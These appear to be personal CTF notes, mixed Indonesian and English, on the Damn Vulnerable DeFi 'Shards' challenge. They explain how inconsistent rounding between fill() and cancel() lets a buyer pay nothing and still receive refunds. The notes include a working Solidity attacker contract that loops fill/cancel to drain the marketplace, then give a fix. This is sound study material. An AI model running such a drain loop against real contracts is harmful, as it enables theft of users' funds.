# Shards Notes(wrote by myself)

- related files: src/shards/, test/shards/

---


### 1. Bug = inconsistent price math (buy vs refund has diffrent formula payment calculation )-> refund -> paid

### 2. Where
src/shards/ShardsNFTMarketplace.sol
- fill()   → baris 139: harga beli pakai mulDivDown(..., offer.totalShards)
- cancel() → baris 166: refund pakai mulDivUp(...,z  1e6)

### 3. leaks reason?
- buyer bayar pas fill() dan di terima balik pas cancel() di hitung dengan rumus yang skalanya beda,pdhl dua duaanya "nilai dari shards sama"

```solidity
- BAYAR (fill, baris 139): want × _toDVT(price,rate) ÷ totalShards
  → 133 × 75e21 ÷ 1e25 = 0.997 → floor → BAYAR 0
- REFUND (cancel, baris 166): shards × rate ÷ 1e6
  → 133 × 75e15 ÷ 1e6 = REFUND 9.975e12
```

refund di bagi 1e6,bayar di bagii total shards (1e25). skala beda jauh -> refund  >> bayar. buyer beli cancel dpet 9.75e12 dari saldo kontrak. selisih di tombok marketplace. attackr ulang fill + cancel tnpa modal -> kuras kontrak


``` solidity
// fill() baris 139 — BAYAR
want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)

// cancel() baris 166 — REFUND
purchase.shards.mulDivUp(purchase.rate, 1e6)
```

### 4. how we breach it :
- 
```solidity
//1tx dari player
function test_shards() public checkSolvedByPlayer {
        new ShardsAttacker(marketplace,token,1,recovery);  
    }



//contractt attacker
contract ShardsAttacker {
    constructor(
        ShardsNFTMarketplace marketplace,
        DamnValuableToken token,
        uint64 offerId,
        address recovery
    ) {
        //1. approve marketpllace pull dvt attacker (even tho kg ad yng ketarik @the end )
        token.approve(address(marketplace),type(uint256).max);

        //2. loop = every cycle buy 133 shards (pay 0),straight cancel (refund 9.975e12)
        for (uint256 i = 0; i < 7520; i++) {
            uint256 idx = marketplace.fill(offerId, 133); //bayar 0
            marketplace.cancel(offerId, idx);   
        }
        //3. send smua hasil ke recovery,attacker balik 0
        token.transfer(recovery,token.balanceOf(address(this)));
    }         
}
```

- Diverifikasi negative control: ganti fill(offerId, 133) → fill(offerId, 134) → attacker mulai bayar 1 DVT, tapi saldo 0 → revert di fill pertama → test gagal. Ngebuktiin exploit bergantung pada floor-to-0 di want ≤ 133.

### 5. severity + reason :
- high 
- direct fund loss,realistic,without heavy precondition 

### 6. Recommendation
Samain rumus refund (cancel) dengan rumus bayar (fill): pakai pembagi 
totalShards yang sama, bukan 1e6. Biar refund = yang beneran dibayar buyer.

